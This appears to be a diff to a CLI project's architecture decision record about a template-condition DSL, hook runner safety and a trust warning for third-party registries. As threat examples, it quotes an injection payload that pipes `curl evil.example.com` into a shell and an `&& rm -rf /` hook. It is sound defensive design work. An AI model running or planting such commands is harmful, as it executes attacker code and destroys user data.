@@ -768,6 +768,8 @@ value      ::= string-literal | number-literal | boolean-literal | array-literal
 
 **Why this matters**: a third-party registry item could ship `when: "1; require('child_process').exec('curl evil.example.com | sh'); 1"` and trick a naive `eval`-based interpreter into executing arbitrary code at install time. The sandboxed AST interpreter closes that hole: the parser refuses the input as a syntax error before evaluation ever happens.
 
+**Why a custom DSL instead of `json-logic-js` or similar**: the trade-off was considered. `json-logic-js` is a well-tested library (~50kb, zero deps) that handles arbitrary boolean expressions with arbitrary operators. The downside: the wire format becomes JSON-shaped (`{"==": [{"var": "database"}, "sqlite"]}`), which is harder to author by hand and harder to read in a PR review than `database != 'sqlite'`. The DSL in this ADR is small enough (4 operators, 3 literal types, 1 combinator pair) that a hand-written parser is justifiable, **on the condition that the parser is fuzz-tested**. The implementation includes a fuzzing suite at `apps/cli/test/unit/when.fuzz.test.ts` that generates 100k random inputs per CI run, feeds them to `parseWhen()`, and asserts either successful parse or `parse_error` (no exceptions, no hangs). Any crash, infinite loop, or unhandled input is a P0 bug.
+
 **`when` against an unknown identifier**: if the `when` references `database` and the user runs `--yes` (skipping prompts), the `database` answer has the documented `default` value. If the prompt is gated by another `when` and never fires, the answer is `undefined`. The interpreter treats `undefined` as failing any `==` comparison (unless compared to `null`); `in` against an `undefined` left side is a runtime error caught by the interpreter and re-raised as `parse_error`. Use a `default` on the prompt, not a `when` that tests for it.
 
 **Anti-patterns**:
@@ -840,9 +842,11 @@ With `deesse.json#packageManager = "bun"`, the CLI spawns `bun install`, `bun db
 
 ## Hook runner safety rules
 
+### What the runner protects against
+
 Hooks are spawned with `shell: false` and tokenised argv, never `shell: true`. This is non-negotiable for two reasons:
 
-1. **Mathematically prevents command chaining.** `&&`, `;`, `|`, backticks, `$()` are never interpreted because the shell is not invoked. Even if an attacker slipped a tokenised character into a whitelist entry, the shell is not there to interpret it.
+1. **Prevents manifest-level command chaining.** `&&`, `;`, `|`, backticks, `$()` are never interpreted because the shell is not invoked. Even if an attacker slipped a tokenised character into a whitelist entry, the shell is not there to interpret it.
 2. **Prevents shell-injection from a malicious `{pm}` value.** The `{pm}` value is the `argv[0]` of a known binary, not a string the shell parses.
 
 **Implementation** at `apps/cli/src/hooks/runner.ts`:
@@ -859,6 +863,26 @@ spawn(file, args, { shell: false, cwd: projectRoot });  // execa or spawn
 - Assert `shell: false` on every spawned child (one fixture per whitelist entry).
 - Assert `{pm} db:push` with `pm = "pnpm"` produces argv `["pnpm", "db:push"]` (no `/bin/sh -c "pnpm db:push"`).
 - Assert `{pm} install` with `pm = "bun"` produces argv `["bun", "install"]`.
+
+### What the runner does NOT protect against (the trust boundary)
+
+The hook runner protects against **manifest command injection** (an item author who writes `&& rm -rf /` in their `deesse-template.json#hooks`). It does **not** protect against **untrusted third-party code execution** that happens downstream of the runner. Specifically:
+
+- `{pm} install` and `{pm} add <dependency>` execute the **npm lifecycle scripts** (`preinstall`, `install`, `postinstall`) of every dependency that lands in `package.json`. A malicious or compromised dependency can run arbitrary code at install time.
+- The runner does not sandbox the spawned process. There is no OS-level sandbox (no `bwrap`, no Landlock, no seccomp). The CLI assumes the user is running it in a normal user environment with the standard package manager installed.
+- The registry item's `dependencies[]` list can pull in any npm package, including ones with `postinstall` scripts.
+
+**For third-party registries, the CLI surfaces a one-time trust warning at first install from an unfamiliar host**:
+
+```
+Warning: this template installs untrusted dependencies.
+The package manager will run lifecycle scripts (preinstall, install, postinstall) for each one.
+Continue? [y/N]
+```
+
+The warning text is configurable per registry; the official `@deessejs` registry never shows it (the items are signed and the team vouched for them). The `--trust-host=<host>` flag on the install command suppresses the warning for subsequent installs from the same host.
+
+The official documentation (a follow-up to this ADR, at `docs/security/cli-trust-model.md`) describes the trust model in full, including the failure modes and recommended mitigations (use `pnpm install --ignore-scripts` if you do not trust a registry, accepting that Prisma, esbuild, and other native-dependency packages will break).
 
 ## Decision
 
